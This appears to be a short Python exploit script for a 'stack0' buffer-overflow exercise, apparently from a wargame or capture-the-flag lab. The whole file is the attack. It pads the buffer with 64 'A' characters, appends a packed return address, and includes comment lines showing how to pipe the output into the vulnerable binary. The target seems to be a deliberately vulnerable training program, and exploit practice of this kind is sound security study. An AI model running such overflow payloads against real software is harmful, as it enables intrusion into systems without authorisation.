# python stack0.py > stack0_exploit
# cat stack0_exploit - | ./stack0
import struct
payload  = 'A' * 64  #overflow buffer
payload += struct.pack("<I",0x00008450)
#payload +='BBBB'*2
print(payload)
